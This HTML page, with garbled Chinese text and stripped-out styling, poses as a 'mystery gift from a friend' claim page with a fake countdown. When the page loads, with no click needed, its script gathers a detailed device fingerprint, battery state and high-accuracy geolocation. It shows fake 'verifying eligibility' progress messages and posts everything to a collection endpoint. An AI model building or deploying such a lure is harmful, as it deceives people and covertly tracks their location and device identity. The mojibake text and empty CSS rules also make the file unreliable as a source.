        /* ç¤¼ç‰©å›¾æ ‡ */

        /* æŒ‰é’®æ ·å¼ */

            color: white;
            border: none;
            padding: 18px 48px;

        .claim-btn::before {

        /* åŠ è½½çŠ¶æ€ */
        .loading {

        }

        .spinner {

        @keyframes spin {

        /* æˆåŠŸçŠ¶æ€ */
        .success {

        }

        .success-icon {

        @keyframes pop {

        .success-text {

        .success-subtitle {

        /* è¿›åº¦æ¡ */
        .progress-container {

        .progress-bar {

        /* å€’è®¡æ—¶ */
        .countdown {

        .countdown-item {

        .countdown-value {

        }

        /* éšè—çš„ iframe ç”¨äºæ›´å¤šä¿¡æ¯ */

</head>
<body>
    <!-- èƒŒæ™¯ç²’å­ -->
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="gift-icon">ğŸ</div>
        <h1>æ­å–œï¼æ‚¨è¢«é€‰ä¸­äº†ï¼</h1>
        <p class="subtitle">æ‚¨çš„å¥½å‹ç»™æ‚¨å‘é€äº†ä¸€ä»½ç¥ç§˜ç¤¼ç‰©<br>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ç«‹å³é¢†å–</p>
        
        <!-- å€’è®¡æ—¶ -->
        <div class="countdown">
            <div class="countdown-item">
                <div class="countdown-value" id="minutes">04</div>
                <div class="countdown-label">åˆ†</div>
            </div>
            <div class="countdown-item">
                <div class="countdown-value" id="seconds">59</div>
                <div class="countdown-label">ç§’</div>
            </div>
        </div>

        <div id="main-content">
            <button class="claim-btn" onclick="claimGift()">ğŸ‰ ç«‹å³é¢†å–ç¤¼ç‰©</button>
        </div>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text">æ­£åœ¨éªŒè¯æ‚¨çš„é¢†å–èµ„æ ¼...</div>
        </div>

        <div class="success" id="success">
            <div class="success-icon">âœ…</div>
            <div class="success-text">é¢†å–æˆåŠŸï¼</div>
            <div class="success-subtitle">ç¤¼ç‰©æ­£åœ¨é£é€Ÿé€å¾€æ‚¨çš„æ‰‹ä¸­~</div>
        </div>

        <div class="progress-container" id="progress">
            <div class="progress-bar">
                <div class="progress-fill" id="progress-fill"></div>
            </div>
            <div class="progress-text" id="progress-text">æ­£åœ¨å‡†å¤‡...</div>
        </div>
    </div>

    <script>
        // API åœ°å€ - éƒ¨ç½²åæ›¿æ¢
        const API_URL = '/api/collect';

        // ç”Ÿæˆç²’å­
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
                particle.style.width = (5 + Math.random() * 10) + 'px';
                particle.style.height = particle.style.width;
                container.appendChild(particle);
            }
        }

        // å€’è®¡æ—¶
        let totalSeconds = 299; // 4:59
        function updateCountdown() {
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
            document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
            if (totalSeconds > 0) {
                totalSeconds--;
                setTimeout(updateCountdown, 1000);
            }
        }

        // æ”¶é›†è®¾å¤‡ä¿¡æ¯
        async function collectDeviceInfo() {
            const info = {
                // User Agent
                userAgent: navigator.userAgent,
                
                // å¹³å°ä¿¡æ¯
                platform: navigator.platform || navigator.userAgentData?.platform,
                
                // å±å¹•ä¿¡æ¯
                screenWidth: screen.width,
                screenHeight: screen.height,
                devicePixelRatio: window.devicePixelRatio,
                colorDepth: screen.colorDepth,
                
                // æµè§ˆå™¨ä¿¡æ¯
                browserName: getBrowserName(),
                browserVersion: getBrowserVersion(),
                language: navigator.language,
                languages: navigator.languages ? [...navigator.languages] : [navigator.language],
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                
                // ç¡¬ä»¶ä¿¡æ¯
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                
                // é¡µé¢ä¿¡æ¯
                referrer: document.referrer,
                pageUrl: window.location.href
            };

            // ç½‘ç»œä¿¡æ¯
            if (navigator.connection) {
                info.connectionType = navigator.connection.type;
                info.downlink = navigator.connection.downlink;
                info.effectiveType = navigator.connection.effectiveType;
                info.rtt = navigator.connection.rtt;
            }

            // ç”µæ± ä¿¡æ¯
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = battery.level;
                    info.batteryCharging = battery.charging;
                }
            } catch (e) {}

            return info;
        }

        // è·å–æµè§ˆå™¨åç§°
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            return 'Unknown';
        }

        // è·å–æµè§ˆå™¨ç‰ˆæœ¬
        function getBrowserVersion() {
            const ua = navigator.userAgent;
            let match;
            if (ua.includes('Firefox')) {
                match = ua.match(/Firefox\/(\d+)/);
            } else if (ua.includes('Chrome')) {
                match = ua.match(/Chrome\/(\d+)/);
            } else if (ua.includes('Safari')) {
                match = ua.match(/Version\/(\d+)/);
            } else if (ua.includes('Edg')) {
                match = ua.match(/Edg\/(\d+)/);
            }
            return match ? match[1] : 'Unknown';
        }

        // è·å–ä½ç½®ä¿¡æ¯
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({});
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        console.log('Location error:', error.message);
                        resolve({});
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // å‘é€æ•°æ®
        async function sendData(data) {
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            } catch (e) {
                console.log('Send error:', e);
            }
        }

        // æ›´æ–°è¿›åº¦
        function updateProgress(percent, text) {
            document.getElementById('progress-fill').style.width = percent + '%';
            document.getElementById('progress-text').textContent = text;
        }

        // é¢†å–ç¤¼ç‰©
        async function claimGift() {
            // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
            document.getElementById('main-content').classList.add('hidden');
            document.getElementById('loading').style.display = 'flex';
            document.getElementById('progress').style.display = 'block';

            // æ”¶é›†è®¾å¤‡ä¿¡æ¯
            updateProgress(20, 'æ­£åœ¨éªŒè¯èº«ä»½...');
            const deviceInfo = await collectDeviceInfo();
            
            // è·å–ä½ç½®
            updateProgress(50, 'æ­£åœ¨è·å–ä½ç½®ä¿¡æ¯...');
            const locationInfo = await getLocation();
            
            // åˆå¹¶ä¿¡æ¯
            const allInfo = { ...deviceInfo, ...locationInfo };
            
            // å‘é€æ•°æ®
            updateProgress(80, 'æ­£åœ¨å¤„ç†...');
            await sendData(allInfo);
            
            // å®Œæˆ
            updateProgress(100, 'å®Œæˆï¼');
            
            setTimeout(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('progress').style.display = 'none';
                document.getElementById('success').style.display = 'flex';
            }, 500);
        }

        // é¡µé¢åŠ è½½æ—¶è‡ªåŠ¨æ”¶é›†æ‰€æœ‰ä¿¡æ¯ï¼ˆåŒ…æ‹¬ä½ç½®ï¼‰
        window.onload = async function() {
            createParticles();
            updateCountdown();
            
            // è‡ªåŠ¨å¼€å§‹æ”¶é›†æ‰€æœ‰ä¿¡æ¯
            await claimGift();
        };
    </script>
</body>
